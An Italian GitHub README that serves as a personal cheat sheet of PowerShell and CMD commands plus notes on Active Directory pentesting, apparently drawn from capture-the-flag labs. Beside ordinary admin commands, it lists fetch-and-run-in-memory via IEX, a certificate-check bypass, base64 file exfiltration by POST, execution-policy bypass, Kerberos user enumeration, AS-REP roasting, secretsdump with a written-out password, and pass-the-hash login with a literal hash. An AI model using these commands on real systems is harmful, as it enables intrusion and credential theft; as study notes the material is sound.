# Lista Link  
[Comandi Powershell](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell)
<!-- spazio -->
   - [Comandi Powershell info generali PC](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell-info-generali-pc)
   - [Download/Upload file](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#downloadupload-file)
<!-- spazio -->
[Active Directory Pentest:](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#active-directory-pentest)
<!-- spazio -->
   - [Comandi per enumerare le macchine a dominio con powerview](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-per-enumerare-le-macchine-a-dominio-attraverso-powerview)
   - [Bloodhund settings]()
   - [Note pentest
<!-- spazio -->
[Note:](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note)
<!-- spazio -->
   - [Note sulla sicurezza in Windows](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-sulla-sicurezza-in-windows)

### Comandi Powershell

    fl #per ricevere più output 
ES: 
_Get-Acl | fl_

    Get-Help <nome comando > -Full #ottieni l'help dei comandi
 <!-- spazio -->
    Update-Help -Force #per aggiornare gli help alla versione più recente    
 <!-- spazio -->
    Select-Object #utilizzato per prendere un campo dell'oggetto specifico 
ES:
_Get-LocalUser John | Select-Object LastLogon output: 03/02/2019 5:48:32 PM_

    Get-Command #utilizzato per sapere se un comando o un eseguibile è presente in powershell
<!-- spazio -->
    New-LocalUser  #per creare nuovi utenti locali
ES:
_New-LocalUser -Name $User -Password (ConvertTo-SecureString -AsPlainText "123456789" -Force)_

    New-LocalGroup #per creare un nuovo gruppo
ES:
_New-LocalGroup -Name $Group_

    Add-LocalGroupMember #aggiungi un utente ad un gruppo
ES:
_Add-LocalGroupMember -Group $Group -Member $User_

    reg query #per interrogare i registri
<!-- spazio -->
    New-item #per creare file, cartelle o modificare valori
<!-- spazio -->
    Start-service #per avviare un servizio
<!-- spazio -->
    Set-item #per modificare file, cartelle o modificare valori
<!-- spazio -->
ES:
_Start-service WinRM_
<!-- spazio -->
      Get-NetIPAddress #comando powershell per ottenere configurazione di rete
 <!-- spazio -->     

### Comandi Powershell per i File
<!-- spazio -->
      Get-Content -path "<file>" # comando per leggere il contenuto
ES:
<!-- spazio -->
_(Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)_
<!-- spazio -->
      [IO.File]::WriteAllBytes(<file path>, <dati da scrivere>) #dalla classe IO.FILE richiama WriteAllBytes che scrive i Bytes
<!-- spazio -->

### Comandi Powershell info generali PC  

    Get-ComputerInfo #prendi informazioni della macchina
<!-- spazio -->
    Get-Localuser #listi gli utenti nella macchina
<!-- spazio -->
    Get-ScheduledTask #listi tutti gli schedule task / tasklis
<!-- spazio -->
    Get-Acl #per listare le access-list dei permessi
<!-- spazio -->
    Get-PSDrive  #lista i drive dell'ambiente legati a powershell che possono essere variabili,oggetti,registri e volumi.
<!-- spazio -->  
    Get-ADDomain #per prendere tutte le informazione dell'AD Domain

### Download/Upload File
_I modi per scaricare un file sono molteplici in powershell:_
<!-- spazio -->
      (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File>') #semplice donwload
 <!--spazio -->
      (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')#download async cioè senza bloccare il calling thread
 <!--spazio -->
      [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} #Bypassing controllo certificato 
 <!--spazio -->
_possiamo trasferire un file senza dovre scaricare uno script ma runnarlo direttamente in memoria:_ 
 <!-- spazio -->
      IEX (New-Object Net.WebClient).DownloadString(<target File URL>, <Output File>) # tramite IEX(Invoke-Expression) runniamo direttamentei in memoria
 <!-- spazio -->
 _Powershell non ha una funzione built-in di upload ma può scaricata_
 <!-- spazio -->
      IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
      #scarichiamo un .ps1 con delle funzioni che permettono l'upload di file
<!-- spazio -->
      Invoke-FileUpload -Uri <Ip target> -File C:\>+<file upload>
      #comando per fare upload
<!-- spazio -->
      b64 = [System.convert]::ToBase64String((Get-Content -Path '<file target>' -Encoding Byte))
      #variabile che stora il base64 del file
<!-- spazio -->      
      Invoke-WebRequest -Uri <ip server> -Method POST -Body $b64 #madnaimo il base64 del file
      #comando 
<!-- spazio -->
__N.B. _Invoke-WebRequest_ è progettato per inviare o ricevere richieste in POST o GET, mentre la funzione _Invoke-FileUpload_ è una funzione facente parte
dello script _PSUpload.ps1_ che semplficia l'upload di file.__
<!-- spazio -->
_SMB_
<!-- spazio -->
      copy \\<ip target>\share\esempio.txt #copiare da un SMB senza credenziali
<!-- spazio -->
      net use n: \\<ip target>\share /user:test test #fare il mount da di un SMB su una windows machine
<!-- spazio -->
      copy <file da caricare> \\<ip targer>\<cartella>\ #upload di file
<!-- spazio -->
# Active Directory Pentest

_comandi SMB:_
<!-- spazio -->

    smbmap -H <ip> -L #comando per listare e indica i permessi
<!-- spazio -->

    smbclient -L \\\\\<ip>\\ #comando per listare
<!-- spazio -->

    smbclient  \\\\<ip>\\<shares> -U <user> #comando per entrare nello share e poi inserire la password
<!-- spazio -->
_enumerazione del DC:_
Comando per enumerare il DC, ci da l'output di: nome dominio, gruppi, utenti e SMB e altro:
<!-- spazio -->

    enum4linux <ip> #enumerazione
    
_enumerazione utenti:_
<!-- spazio -->

-crackmapexec, però se abbiamo l'accesso a IPC$ all'interno di SMB:
<!-- spazio -->

    crackmapexec smb VULNNET-RST -u 'guest' -p '' --rid-brute
<!-- spazio -->

-kerbrute, tramite una lista di user possiamo vederee che Users ci sono:
<!-- spazio -->

    kerbrute_linux_amd64 userenum -d <domain_name> --dc <domain_controller_ip> <wordlist>
<!-- spazio -->

_recupero TGT utenti:_
<!-- spazio -->

    impacket-GetNPUsers VULNNET-RST/t-skid -no-pass # funziona solamente con utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH
<!-- spazio -->

_recupero credenziali:_
<!-- spazio -->

    impacket-secretsdump -dc-ip 10.10.208.78 a-whitehat:bNdKVkjv3RR9ht@10.10.208.78 # recupera NTDS.DIt, SAM hashes
<!-- spazio -->
_connessione remota alla target machine:_
<!-- spazio -->

    evil-winrm -i 10.10.113.15 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d #utilizziamo il WinRM protocol per connettersi
<!-- spazio -->

### Comandi per enumerare le macchine a dominio (attraverso PowerView)

Scaricare PowerView.ps1 sulla macchina e avviarlo:
<!-- spazio -->
    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    powershell -ep bypass
    . .\PowerView.ps1
<!-- spazio -->
dopo aver avviato powerview abbiamo a disposizione dei comandi aggiuntivi per la rete di dominio:
enumerare gli utenti a dominio:

    Get-NetUser #ottiene le informazioni sugli utenti

<!-- spazio -->

    Get-NetUser | select cn #per ottenere solo il common name

<!-- spazio -->

    Get-NetGroup    #ottiene tutti i gruppi presenti a dominio

<!-- spazio -->

    Get-NetGroup -GroupName *admin*    #ottiene tutti i gruppi in cui è presente la parola admin

<!-- spazio -->

    Invoke-ShareFinder    #ottiene tutte le shares smb del dominio

<!-- spazio -->

    Get-NetComputer -FullData    #ottiene tutte le informazioni su tutti i pc della rete

<!-- spazio -->

    Get-NetComputer -FullData | Select-Object logoncount    #per ridurre l'output da parsare selezioniamo l'oggeto specifico come in questo caso per gli accessi    
### Bloodhund settings

   

#### Note Pentest
_WebDav protocollo che estende HTTP per la connessione in remoto._
_DavWWWRoot è una parola speciale riconosciuta dalla windows shell, utilizzata quando si vuole connettere ad un WebDav server, questa parola
specifica di voler connettersi alla root del server._

# Note

_Wmi è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer quindi per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_
_Get-WmiObject #comando per ottenere oggetti fisici o logici gestibili dal WMi, insiemi a lui di solito va specificato la __-Class__ cioè la classe da recuperare._

_MMC(Microsoft managment console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalitè del MMC che ha il compito di monitorare risorse hardware e software._

_Wmi è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer quindi per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_

_MMC(Microsoft managment console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalitè del MMC che ha il compito di monitorare risorse hardware e software._

_WSL(WIndows subsystem linux) un vero sottosistema che simula l'utilizzo di una shell linux, si installa con questo comando:
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux_

_BitsAdmin è uno strumento della riga di comando di Windows utilizzato per gestire il servizio Background Intelligent Transfer Service (BITS). 
BITS è un servizio di Windows che consente il trasferimento asincrono di file su Internet o in una rete locale._

### Note sulla sicurezza in Windows

_SID(Security Identifier) aggiunto a utente,gruppi,domini o a qualsiasi altro entità di sicurezza, viene utilizzato per gestire l'accesso alle risorse_

ES:
_S-1-5-21-674899381-4069889467-2080702030-1002_

_SAM(Security account manager) database interno che contiene le informazioni dei vari utenti come password, hash e nomi utenti, è utilizzato dal LSA(lsass.exe) per l'autenticazione._

_ACL(Access control list) e ACE (Access control entrie) le ACE le troviamo dentro l'ACL, le ACE possono avere diverse regole come: deny o allow e si applicano su risorse e utenti._

_UAC(User Access ControlL) utilizzato per non fare eseguire codice o script malevoli, in quanto richiede i priviliegi di amministratore._

_AppLocker permette un controllo granulare di script e dll, permette di aggiungere delle regole sempre su di loro._

_Local group policy utilizzato per le policy di sicurezza dei gruppi._
